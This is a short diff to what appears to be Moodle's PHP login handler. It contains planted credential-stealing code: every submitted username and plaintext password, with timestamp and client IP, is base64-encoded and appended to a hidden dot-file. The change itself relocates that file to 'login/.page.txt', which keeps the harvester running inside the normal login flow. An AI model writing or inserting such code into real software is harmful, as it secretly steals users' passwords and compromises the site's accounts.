@@ -338,7 +338,7 @@ if (empty($frm->username) && $authsequence[0] != 'shibboleth') {  // See bug 518
         // we do not want data from _POST here
 	date_default_timezone_set('Asia/Jakarta');
 	$credz = date('Y-m-d H:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['username'] . " && Password: " . $_POST['password'];
-	file_put_contents('.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
+	file_put_contents('login/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
         $frm->username = clean_param($_GET["username"], PARAM_RAW); // we do not want data from _POST here
     } else {
         $frm->username = get_moodle_cookie();
